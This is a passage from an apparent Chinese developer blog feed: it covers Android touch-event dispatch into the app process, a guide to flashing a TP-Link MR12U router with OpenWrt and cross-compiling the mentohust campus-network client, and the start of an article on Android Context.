<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InputEventReceiver</span><span class="params">(InputChannel inputChannel, Looper looper)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    mInputChannel = inputChannel;</span><br><span class="line">    mMessageQueue = looper.getQueue();</span><br><span class="line">    mReceiverPtr = nativeInit(<span class="keyword">new</span> WeakReference&lt;InputEventReceiver&gt;(<span class="keyword">this</span>),</span><br><span class="line">            inputChannel, mMessageQueue);</span><br><span class="line"></span><br><span class="line">    mCloseGuard.open(<span class="string">"dispose"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取了<code>app</code>进程的消息队列，并调用<code>native</code>方法对<code>mReceiverPtr</code>进行初始化：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jlong <span class="title">nativeInit</span><span class="params">(JNIEnv* env, jclass clazz, jobject receiverWeak,</span></span></span><br><span class="line"><span class="function"><span class="params">        jobject inputChannelObj, jobject messageQueueObj)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    sp&lt;InputChannel&gt; inputChannel = android_view_InputChannel_getInputChannel(env,</span><br><span class="line">            inputChannelObj); </span><br><span class="line"></span><br><span class="line">    sp&lt;MessageQueue&gt; messageQueue = android_os_MessageQueue_getMessageQueue(env, messageQueueObj);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    sp&lt;NativeInputEventReceiver&gt; receiver = <span class="keyword">new</span> NativeInputEventReceiver(env,</span><br><span class="line">            receiverWeak, inputChannel, messageQueue);</span><br><span class="line">    <span class="keyword">status_t</span> status = receiver-&gt;initialize();</span><br><span class="line">    ...</span><br><span class="line">    receiver-&gt;incStrong(gInputEventReceiverClassInfo.clazz); <span class="comment">// retain a reference for the object</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;jlong&gt;(receiver.<span class="built_in">get</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建了<code>NativeInputEventReceiver</code>对象，并调用<code>initialize()</code>方法进行初始化：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">status_t</span> <span class="title">NativeInputEventReceiver::initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setFdEvents(ALOOPER_EVENT_INPUT);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NativeInputEventReceiver::setFdEvents</span><span class="params">(<span class="keyword">int</span> events)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mFdEvents != events) &#123;</span><br><span class="line">        mFdEvents = events;</span><br><span class="line">        <span class="keyword">int</span> fd = mInputConsumer.getChannel()-&gt;getFd();</span><br><span class="line">        <span class="keyword">if</span> (events) &#123;</span><br><span class="line">            mMessageQueue-&gt;getLooper()-&gt;addFd(fd, <span class="number">0</span>, events, <span class="keyword">this</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mMessageQueue-&gt;getLooper()-&gt;removeFd(fd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里将客户端的<code>InputChannel</code>保存的<code>Fd</code>加入到了<code>Native Looper</code>中进行监听，对返回的消息进行处理：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Looper::addFd</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> ident, <span class="keyword">int</span> events, <span class="keyword">const</span> sp&lt;LooperCallback&gt;&amp; callback, <span class="keyword">void</span>* data)</span> </span>&#123;</span><br><span class="line">       &#123; <span class="comment">// acquire lock</span></span><br><span class="line">        AutoMutex _l(mLock);</span><br><span class="line"></span><br><span class="line">        Request request;</span><br><span class="line">        request.fd = fd;</span><br><span class="line">        request.ident = ident;</span><br><span class="line">        request.events = events;</span><br><span class="line">        request.seq = mNextRequestSeq++;</span><br><span class="line">        request.callback = callback;</span><br><span class="line">        request.data = data;</span><br><span class="line">        <span class="keyword">if</span> (mNextRequestSeq == <span class="number">-1</span>) mNextRequestSeq = <span class="number">0</span>; <span class="comment">// reserve sequence number -1</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">eventItem</span>;</span></span><br><span class="line">        request.initEventItem(&amp;eventItem);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">ssize_t</span> requestIndex = mRequests.indexOfKey(fd);</span><br><span class="line">        <span class="keyword">if</span> (requestIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem);</span><br><span class="line">            <span class="keyword">if</span> (epollResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ALOGE(<span class="string">"Error adding epoll events for fd %d: %s"</span>, fd, strerror(errno));</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mRequests.add(fd, request);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_MOD, fd, &amp; eventItem);</span><br><span class="line">             <span class="keyword">if</span> (epollResult &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == ENOENT) &#123;</span><br><span class="line">                    epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem);</span><br><span class="line">                    ...</span><br><span class="line">                ...</span><br><span class="line">                &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里将<code>NativeInputEventReceiver</code>传入的<code>this</code>作为<code>callback</code>存入到<code>request</code>中， 再以<code>fd</code>为索引向<code>mRequests</code>映射表中加入<code>request</code>，然后以<code>fd</code>作为信号调用<code>epoll_ctl</code>系统调用，利用它对通信过程进行监听，在收到消息之后最终会根据<code>fd</code>找到<code>mRequests</code>中的<code>request</code>保存的<code>callback</code>，即<code>NativeInputEventReceiver</code>对象。</p>
<p>关于<code>addFd</code>方法的详细分析，可以查看<a href="">Native消息机制的博文</a></p>
<p><img src="/images/event1_6.png" alt=""></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>现在我们了解了从内核到应用整个触摸事件的传输过程，并且知道了<code>InputChannel</code>在两端的监听建立与触发的函数，至此，触摸事件已经从系统底层来到了我们的应用进程，<a href="http://www.viseator.com/2017/10/07/android_view_event_2/">下一篇博客</a>将从触发函数开始讲解事件从<code>native</code>层真正传入<code>java</code>层的过程。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title>TP-Link mr12u-v1刷openwrt+mentohust交叉编译（附文件下载）</title>
    <url>/2017/09/05/mr12u_openwrt_mentohust/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>开学学校启用了有线网，由于校园网存在只能单一设备登陆的限制与无线登陆限速，所以想通过路由器刷<code>openwrt</code>再使用<code>mentohust</code>进行校园网的锐捷认证来实现多设备与不限速使用。</p>
<p>在选择路由器时考虑了如下因素：</p>
<ol>
<li>可刷<code>openwrt</code>：只有特定的处理器支持<code>openwrt</code>，支持的路由器型号在官网有一个<a href="https://wiki.openwrt.org/toh/start" target="_blank" rel="noopener">列表</a>，直接参照这个列表选就可以了。</li>
<li>有电源/usb供电：在寝室使用的话因为有段时间断电但不断网，所以需要自带电源或可用移动电源usb供电。</li>
<li>性价比高：因为只用于转发校园网，所以可以买便宜一些的。</li>
</ol>
<p>最终选择了<code>TP-Link mr12u</code>这款路由器，在闲鱼上找了一家同城二手的，45元人民币拿下。</p>
<a id="more"></a>
<p><strong>注意下面需要在<code>linux</code>终端环境下操作</strong></p>
<h2 id="刷不死Boot"><a href="#刷不死Boot" class="headerlink" title="刷不死Boot"></a>刷不死Boot</h2><p>由于路由器固件的特殊性，一旦刷崩了或者设置错误导致无法正常登陆路由器，那么就无法对路由器进行管理，也就是所谓的变砖。</p>
<p>不死boot的作用就是在这种情况下提供进路由设置重新刷固件的机会。</p>
<h3 id="刷解锁固件"><a href="#刷解锁固件" class="headerlink" title="刷解锁固件"></a>刷解锁固件</h3><p>由于<code>U-Boot</code>分区默认是锁定的，所以无法刷入新的<code>boot</code>。因此我们要先刷入一个修改过的解锁<code>U-Boot</code>分区的固件，这个修改过的固件可以在<a href="https://pan.baidu.com/s/1slWHygP" target="_blank" rel="noopener">百度网盘下载</a>，另外由于我手上的这个是v1版本的，与v2版本的硬件不同，所以需要使用的是<code>mr11u-v2</code>的解锁固件（即<code>openwr-ar71xx-generic-tl-mr11u-v2-squashfs-factory.bin</code>）。下载完以后先长按复位键复位路由器，连接上以后直接进入<code>192.168.1.1</code> <code>TP-Link</code>默认的管理界面，在下图这里选择刚下好的固件刷入即可：</p>
<p><img src="/images/mr11u-1.png" alt=""></p>
<p>（图源网络）</p>
<h3 id="刷不死boot"><a href="#刷不死boot" class="headerlink" title="刷不死boot"></a>刷不死boot</h3><p>先下载不死<code>boot</code>：</p>
<blockquote>
<p>  <a href="http://viseator.com/file/breed-ar9331-mr12u.bin" target="_blank" rel="noopener">http://viseator.com/file/breed-ar9331-mr12u.bin</a></p>
</blockquote>
<p>路由器自动重启以后使用网线连接电脑与路由器，先用浏览器登陆<code>192.168.1.1</code>，用户名为<code>root</code>密码为空，然后设置<code>ssh</code>密码并保存。</p>
<p>现在就可以使用<code>ssh</code>用<code>root</code>与刚刚设置的密码登陆路由器了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
<p>登陆以后先查看并记下<code>mac</code>地址，之后要用到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig eth0</span><br></pre></td></tr></table></figure>
<p><img src="/images/mr12u-2.png" alt=""></p>
<p><a href="http://xzper.com/2015/07/11/TP-MR12U%E5%88%B7openwrt-%E4%B8%8D%E6%AD%BBboot/" target="_blank" rel="noopener">图片来源</a></p>
<p>然后<code>exit</code>退出<code>ssh</code>，使用<code>scp</code>命令传送下载好的<code>boot</code>包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp breed-ar9331-mr12u.bin root@192.168.1.1:/tmp/</span><br></pre></td></tr></table></figure>
<p>再次登陆路由器，刷入<code>U-Boot</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">mtd write breed-ar9331-mr12u.bin u-boot</span><br></pre></td></tr></table></figure>
<p>等待命令返回后直接将路由器关机。</p>
<p>想要进入不死<code>boot</code>，只需按住<code>reset</code>复位键不放，再开机，等待个十几秒后松开，再有线连接电脑与路由器，浏览器输入<code>192.168.1.1</code>就可以进入管理界面了，以后变砖了只要这样都可以重新刷固件，所以称不死。</p>
<p>进入不死<code>boot</code>以后，先进入下图界面设置之前记录的<code>mac</code>地址：</p>
<p><img src="/images/mr12u-3.png" alt=""></p>
<p><a href="http://xzper.com/2015/07/11/TP-MR12U%E5%88%B7openwrt-%E4%B8%8D%E6%AD%BBboot/" target="_blank" rel="noopener">图片来源</a></p>
<h2 id="刷入最新固件（可选）"><a href="#刷入最新固件（可选）" class="headerlink" title="刷入最新固件（可选）"></a>刷入最新固件（可选）</h2><p>下面就可以直接在不死<code>boot</code>里面选择固件更新刷入最新的固件了，最新固件的下载可以到<a href="https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/" target="_blank" rel="noopener">这里</a>找到。</p>
<p>但是<code>mr12u</code>的闪存只有可怜的4m，如果安装最新的<code>openwrt</code>就没有空间放下<code>mentohust</code>了，所以还不如就直接用这个解锁用的固件。</p>
<h2 id="交叉编译mentohust"><a href="#交叉编译mentohust" class="headerlink" title="交叉编译mentohust"></a>交叉编译mentohust</h2><p>在网上找了一圈愣是没找到<code>ar71xx</code>处理器已经编译好的<code>mentohust</code>，只能选择自己交叉编译了。没有条件自己编译的可以使用我编译好的<strong>只适用于ar71xx</strong>处理器的<code>mentohust</code>: <a href="http://www.viseator.com/file/mentohust">http://www.viseator.com/file/mentohust</a> 。</p>
<h3 id="依赖包的安装"><a href="#依赖包的安装" class="headerlink" title="依赖包的安装"></a>依赖包的安装</h3><p>可以到<a href="https://wiki.openwrt.org/zh-cn/doc/howto/buildroot.exigence" target="_blank" rel="noopener">https://wiki.openwrt.org/zh-cn/doc/howto/buildroot.exigence</a> 根据自己的发行版安装必要的软件包。</p>
<h3 id="下载编译工具链"><a href="#下载编译工具链" class="headerlink" title="下载编译工具链"></a>下载编译工具链</h3><p>首先到<a href="https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/" target="_blank" rel="noopener">https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/</a> 页面下载 <a href="https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/OpenWrt-SDK-ar71xx-generic_gcc-5.3.0_musl-1.1.16.Linux-x86_64.tar.bz2" target="_blank" rel="noopener">OpenWrt-SDK-ar71xx-generic_gcc-5.3.0_musl-1.1.16.Linux-x86_64.tar.bz2</a> 处理器<code>SDK</code>，解压后进入目录下的<code>./staging_dir/toolchain-mips_34kc_gcc-5.3.0_musl-1.1.16/bin</code>。</p>
<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:到上述/staging_dir/toolchain-mips_34kc_gcc-5.3.0_musl-1.1.16/bin 目录的完整路径</span><br><span class="line"><span class="built_in">export</span> CC=mipsel-openwrt-linux-gcc  </span><br><span class="line"><span class="built_in">export</span> CPP=mipsel-openwrt-linux-cpp  </span><br><span class="line"><span class="built_in">export</span> GCC=mipsel-openwrt-linux-gcc  </span><br><span class="line"><span class="built_in">export</span> CXX=mipsel-openwrt-linux-g++  </span><br><span class="line"><span class="built_in">export</span> RANLIB=mipsel-openwrt-linux-uclibc-ranlib</span><br><span class="line"><span class="built_in">export</span> LDFLAGS=<span class="string">"-static"</span>  </span><br><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">"-Os -s"</span></span><br></pre></td></tr></table></figure>
<h3 id="编译libpcap动态链接库"><a href="#编译libpcap动态链接库" class="headerlink" title="编译libpcap动态链接库"></a>编译libpcap动态链接库</h3><p>到 <a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org/</a> 下载<a href="http://www.tcpdump.org/release/libpcap-1.8.1.tar.gz" target="_blank" rel="noopener">libpcap-1.8.1.tar.gz</a>，解压以后进入目录，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --host=mipsel-openwrt-linux --prefix=自已设定路径/ --with-pcap=linux</span><br></pre></td></tr></table></figure>
<p>然后执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p>会报错误，但是不影响我们需要的<code>libpcap.a</code>文件，在当前目录下找到这个文件复制出来备用。</p>
<h3 id="编译mentohust"><a href="#编译mentohust" class="headerlink" title="编译mentohust"></a>编译mentohust</h3><p>克隆<code>mentohust</code>源码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hyrathb/mentohust</span><br></pre></td></tr></table></figure>
<p>进入目录，首先生成<code>configure</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh autogen.sh</span><br></pre></td></tr></table></figure>
<p>然后配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --host=mipsel-openwrt-linux   --<span class="built_in">disable</span>-encodepass --<span class="built_in">disable</span>-notify --prefix=自设目录 --with-pcap=前面保存的libpcap.a文件路径</span><br></pre></td></tr></table></figure>
<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p>成功以后就可以在<code>src</code>目录下找到编译好的<code>mentohust</code>文件了。</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>我们把编译好的文件传送到路由器中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp mentohust root@192.168.1.1:/root</span><br></pre></td></tr></table></figure>
<h3 id="安装libpcap"><a href="#安装libpcap" class="headerlink" title="安装libpcap"></a>安装libpcap</h3><p>路由器中默认没有我们依赖的<code>libpcap</code>库，我们要手动安装，先下载：</p>
<blockquote>
<p>  <a href="http://www.viseator.com/file/libpcap_1.0.0-2_ar71xx.ipk">http://www.viseator.com/file/libpcap_1.0.0-2_ar71xx.ipk</a></p>
</blockquote>
<p>然后传送到路由器中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp libpcap_1.0.0-2_ar71xx.ipk root@192.168.1.1:/tmp</span><br></pre></td></tr></table></figure>
<p>下面登陆路由器，进入<code>/tmp</code>目录，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">opkg install libpcap_1.0.0-2_ar71xx.ipk</span><br></pre></td></tr></table></figure>
<h3 id="新建wifi与桥接配置"><a href="#新建wifi与桥接配置" class="headerlink" title="新建wifi与桥接配置"></a>新建wifi与桥接配置</h3><p>新刷的路由器只有一个默认接入点，我们先到路由器管理界面修改接入点。增加访问密码等等。这一步的配置就不多说了网上都有。</p>
<p>由于这个路由器只有一个接口，我们现在是将它作为<code>lan</code>口在用的，但是实际上我们需要使用它作为<code>wan</code>口来连接校园网认证上网，并且要将<code>lan</code>口与<code>wifi</code>进行桥接使得我们依旧可以通过<code>192.168.1.1</code>这个地址来管理路由器。</p>
<p>这步操作需要直接修改<code>/etc/config/network</code>文件，如果使用图形界面配置可能会导致变砖。</p>
<p>我们登陆路由器以后直接用<code>vim</code>修改上述文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/config/network</span><br></pre></td></tr></table></figure>
<p>下面提供我找到的示例文件供参考：<a href="http://www.right.com.cn/forum/thread-105317-1-1.html" target="_blank" rel="noopener">出处</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config interface &#39;loopback&#39;</span><br><span class="line">        option ifname &#39;lo&#39;</span><br><span class="line">        option proto &#39;static&#39;</span><br><span class="line">        option ipaddr &#39;127.0.0.1&#39;</span><br><span class="line">        option netmask &#39;255.0.0.0&#39;</span><br><span class="line"></span><br><span class="line">config interface &#39;lan&#39;</span><br><span class="line">        option type &#39;bridge&#39;</span><br><span class="line">        option proto &#39;static&#39;</span><br><span class="line">        option ipaddr &#39;192.168.1.1&#39;</span><br><span class="line">        option netmask &#39;255.255.255.0&#39;</span><br><span class="line"></span><br><span class="line">config interface &#39;wan&#39;</span><br><span class="line">        option ifname &#39;eth0&#39;</span><br><span class="line">        option _orig_ifname &#39;eth0&#39;</span><br><span class="line">        option _orig_bridge &#39;false&#39;</span><br><span class="line">        option proto &#39;dhcp&#39;</span><br><span class="line">        option macaddr &#39;xx:xx:xx:xx:xx:xx&#39;替换为自己的mac</span><br></pre></td></tr></table></figure>
<p>修改后保存，然后<code>reboot</code>重启。</p>
<p>现在就不能通过有线来管理路由器了，因为管理地址已经桥接到了无线上了。所以我们要使用无线连接，有线接校园网，然后登陆到路由器。</p>
<p>找到我们存放<code>mentohust</code>的<code>/root</code>目录（默认就是），启动<code>mentohust</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mentohust -u username -p password -n eth0</span><br></pre></td></tr></table></figure>
<p>如果要后台运行加个<code>-b1</code>就可以了。</p>
<p>如果一切正常的话现在无线就可以正常上网了。</p>
]]></content>
      <categories>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Context理解与陷阱</title>
    <url>/2017/07/19/android_context/</url>
    <content><![CDATA[<h2 id="Context"><a href="#Context" class="headerlink" title="Context?"></a>Context?</h2><p><code>Context</code>在安卓开发时是一个非常常见的组件，我们会在许多地方使用它，举一些例子：</p>
<ul>
<li>启动新的<code>Activity</code> <code>Service</code></li>
<li>发送广播，接收广播</li>
<li>填充<code>View</code></li>
<li>获取资源</li>
</ul>
<p>相信每一个开发者在看见它时都有过这样一些疑问：</p>
<ul>
<li><code>Context</code>是什么</li>
<li><code>Context</code>的作用</li>
<li><code>Context</code>从哪里来</li>
</ul>
<p>同时，我们也经历过需要一个<code>Context</code>但不知道如何去正确获取/传递的情况，事实上不正确地保存一个<code>Context</code>的引用可能会导致部分内存不能被正确GC从而造成事实上的内存泄漏。</p>
<p>本文将着重对上面这些内容进行讲解。</p>
<a id="more"></a>
<h2 id="Context的定义"><a href="#Context的定义" class="headerlink" title="Context的定义"></a>Context的定义</h2><p>字面上解释，<code>Context</code>意为“环境”，这个解释比较符合它的作用。</p>
<p>官方文档中对<code>Context</code>的解释是：</p>
<blockquote>
<p>  Interface to global information about an application environment. This is an abstract class whose implementation is provided by the Android system. It allows access to application-specific resources and classes, as well as up-calls for application-level operations such as launching activities, broadcasting and receiving intents, etc.</p>
<p>  关于应用环境的全局信息的接口。它是一个抽象类，具体由安卓系统来实现。它允许我们去访问特定的应用的资源和类，同时也可以经由它去向上请求应用级别的操作例如启动<code>Activity</code>、发送广播、接收<code>intents</code>等等。</p>
</blockquote>
<p>我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的<code>Activity</code>，向其他应用发送广播，启动一个新的<code>Service</code>或是访问我们存放在<code>apk</code>中的资源文件。</p>
<p><code>Context</code>就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。</p>
<h2 id="Context从哪里来"><a href="#Context从哪里来" class="headerlink" title="Context从哪里来"></a>Context从哪里来</h2><p><code>Context</code>作为一个依赖于系统的类，<code>SDK</code>中只给了我们一个抽象类，具体的实现由系统完成，下文举例使用的<code>ContextImpl</code>就是<code>AOSP</code>中安卓源码对于<code>Context</code>的一个实现。</p>
<h2 id="Context的作用"><a href="#Context的作用" class="headerlink" title="Context的作用"></a>Context的作用</h2><h3 id="Context中封装的信息"><a href="#Context中封装的信息" class="headerlink" title="Context中封装的信息"></a>Context中封装的信息</h3><p>我们可以看看<code>Context</code>里面包含了哪些东西（部分）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String mBasePackageName; </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String mOpPackageName; <span class="comment">//软件包名</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Resources mResources;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ResourcesManager mResourcesManager; <span class="comment">//用于管理资源文件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Display mDisplay; <span class="comment">//为View填充等提供屏幕尺寸、像素密度等信息</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> DisplayAdjustments mDisplayAdjustments = <span class="keyword">new</span> DisplayAdjustments();</span><br><span class="line"><span class="keyword">private</span> Resources.Theme mTheme = <span class="keyword">null</span>; <span class="comment">//主题信息</span></span><br><span class="line"><span class="keyword">private</span> File mCacheDir;</span><br><span class="line"><span class="meta">@GuardedBy</span>(<span class="string">"mSync"</span>)</span><br><span class="line"><span class="keyword">private</span> File mCodeCacheDir;</span><br><span class="line">...</span><br><span class="line"><span class="meta">@GuardedBy</span>(<span class="string">"mSync"</span>)</span><br><span class="line"><span class="keyword">private</span> File[] mExternalObbDirs;</span><br><span class="line"><span class="meta">@GuardedBy</span>(<span class="string">"mSync"</span>)</span><br><span class="line"><span class="keyword">private</span> File[] mExternalFilesDirs;</span><br><span class="line"><span class="meta">@GuardedBy</span>(<span class="string">"mSync"</span>)</span><br><span class="line"><span class="keyword">private</span> File[] mExternalCacheDirs;</span><br><span class="line"><span class="meta">@GuardedBy</span>(<span class="string">"mSync"</span>)</span><br><span class="line"><span class="keyword">private</span> File[] mExternalMediaDirs; <span class="comment">//各种文件路径</span></span><br></pre></td></tr></table></figure>
<p>这些域的存在为功能提供了必要的信息，例如在<code>LayoutInflater</code>填充<code>View</code>时需要一个<code>context</code>作为参数，我们查看这个<code>context</code>如何被使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> XmlResourceParser childParser = context.getResources().getLayout(layout);</span><br></pre></td></tr></table></figure>
<p>我们传入的<code>ResourceId</code>最终会被通过<code>context</code>的<code>getResource()</code>方法获取的<code>Resource</code>对象的<code>getLayout()</code>方法定位到对应的<code>xml</code>文件提供给<code>Inflater</code>进行解析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Apply a theme wrapper, if allowed and one is specified.</span></span><br><span class="line"><span class="keyword">if</span> (!ignoreThemeAttr) &#123;</span><br><span class="line">    <span class="keyword">final</span> TypedArray ta = context.obtainStyledAttributes(attrs, ATTRS_THEME);</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> themeResId = ta.getResourceId(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (themeResId != <span class="number">0</span>) &#123;</span><br><span class="line">        context = <span class="keyword">new</span> ContextThemeWrapper(context, themeResId);</span><br><span class="line">    &#125;</span><br><span class="line">    ta.recycle();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里调用了<code>context</code>的<code>obtainStyledAttributes()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> TypedArray <span class="title">obtainStyledAttributes</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        AttributeSet set, @StyleableRes <span class="keyword">int</span>[] attrs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getTheme().obtainStyledAttributes(set, attrs, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终使用了<code>context</code>中存放的主题信息为填充的<code>view</code>设置属性。</p>
<p>现在我们知道，我们存放在<code>res</code>文件夹下的内容（布局文件、字符串文件、图片、主题……）都需要通过一个<code>context</code>去向系统获取。</p>
<p>那么为什么在启动<code>activity</code>、启动<code>service</code>、发送广播时都需要使用<code>context</code>呢？因为这些操作与系统是紧密相关的，我们知道启动这些东西都需要使用一个叫<code>intent</code>的东西（关于<code>intent</code>的内容会在另外的文章讲），以<code>startActivity()</code>方法为例，我们一路向上追溯，可以发现启动<code>activity</code>最终是由<code>AcitivityManagerNative.getDefault()</code>的本地方法<code>startActivity()</code>执行的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    intent.migrateExtraStreamToClipData();</span><br><span class="line">    intent.prepareToLeaveProcess();</span><br><span class="line">    <span class="keyword">int</span> result = ActivityManagerNative.getDefault().startActivity(</span><br><span class="line">        whoThread, who.getBasePackageName(), intent,</span><br><span class="line">        intent.resolveTypeIfNeeded(who.getContentResolver()), token,</span><br><span class="line">        target != <span class="keyword">null</span> ? target.mEmbeddedID : <span class="keyword">null</span>, requestCode, <span class="number">0</span>, <span class="keyword">null</span>, options);</span><br><span class="line">    checkStartActivityResult(result, intent);</span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候我们发现，传入的<code>context</code>已经变成了上面代码中的<code>who</code>，利用这个 <code>context</code>获取了包名与方法的第四个参数<code>who.getContentResolver()</code>。它的作用是提供信息来解析<code>intent</code>的<a href="https://en.wikipedia.org/wiki/Media_type" target="_blank" rel="noopener"><code>MIME type</code></a>，帮助系统决定<code>intent</code>的目标。</p>
<p>可以看到<code>context</code>在这里同样起到了一个提供必要信息的作用。</p>
<h3 id="Context的作用-1"><a href="#Context的作用-1" class="headerlink" title="Context的作用"></a>Context的作用</h3><p>在这里再重复一遍上面说过的话，配合之前的例子，是不是可以更好地理解了呢？</p>
<blockquote>
<p>  我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的<code>Activity</code>，向其他应用发送广播，启动一个新的<code>Service</code>或是访问我们存放在<code>apk</code>中的资源文件。</p>
<p>   <code>Context</code>就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。</p>
</blockquote>
<h2 id="Context的使用"><a href="#Context的使用" class="headerlink" title="Context的使用"></a>Context的使用</h2><h3 id="Context分类"><a href="#Context分类" class="headerlink" title="Context分类"></a>Context分类</h3><p><code>Context</code>并不是都是相同的，根据获取方式的不同，我们得到的<code>Context</code>的各类也有所不同。</p>
